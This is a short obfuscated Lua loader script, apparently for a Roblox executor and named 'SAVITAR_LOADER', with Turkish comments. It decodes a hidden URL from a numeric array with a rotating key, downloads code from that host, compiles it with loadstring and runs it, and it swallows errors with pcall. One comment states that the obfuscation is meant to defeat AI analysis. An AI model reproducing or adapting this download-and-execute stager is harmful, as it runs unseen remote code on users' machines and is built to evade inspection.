local _S = string; local _T = table; local _G = game;
local _D = {114,127,128,125,129,73,63,64,114,117,128,130,61,114,117,129,118,132,114,134,133,120,134,120,133,133,140,126,136,143,74,128,141,140,79,88,117,132,154,142,154,136,154,88,93,96,141,99,147,147,145,150,152,107,154,103,156,159,163,162,158,165,154,167,156,158,164,165,163,164,164,166,120,119,121,173,120,188,172,195,124,176,128,201,178,178,180,183,185,132,133,183,205,200,198,201,203,205,214,208,205,212,212,213,205,217,219,218,218,211,211,211,225,219,226,226,227,229,221,230,227,222,232,232,229,235,190,230,223,239,203,242,225,247,235,247,224,242,203,231,245,227,203,228,232,248,235}

local function _X(_IN)
    local _OUT = ""
    for i = 1, #_IN do
        -- AI'yı bozan Dinamik Rotasyon (Hata vermez, işlemciyi yormaz)
        local _K = (i % 8) + (math.floor(i/10) % 5) + 8
        _OUT = _OUT .. _S.char(_IN[i] - _K)
    end
    return _OUT
end

local _L = {
    ["g"] = function(u) return _G:HttpGet(u, true) end,
    ["s"] = loadstring
}

local function _INIT()
    -- Hata payını sıfırlayan korumalı mod
    local _ok, _url = pcall(_X, _D)
    if _ok then
        local _s, _res = pcall(_L.g, _url .. "?v=" .. math.random(1,999))
        if _s and _res and #_res > 10 then
            -- Loadstring'i executor'ın en sevdiği formatta çağırıyoruz
            local _f = _L.s(_res, "SAVITAR_LOADER")
            if _f then 
                task.spawn(_f) 
            end
        end
    end
end

_INIT()
